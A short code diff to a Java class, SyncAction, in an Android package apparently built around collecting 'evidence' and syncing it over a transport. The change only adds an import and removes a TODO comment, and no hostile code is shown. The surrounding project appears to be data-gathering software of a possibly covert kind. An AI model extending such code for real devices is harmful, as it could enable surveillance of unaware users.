@@ -27,6 +27,7 @@ import com.android.dvci.evidence.EvidenceCollector;
 import com.android.dvci.interfaces.iProtocol;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
 // TODO: Auto-generated Javadoc
@@ -141,7 +142,7 @@ public abstract class SyncAction extends SubActionSlow {
 
 					// enable() should manage internally the "forced" state
 					transport.enable();
-					// TODO: wait for the enabling.
+
 				}
 
 				// Now the transport should be available
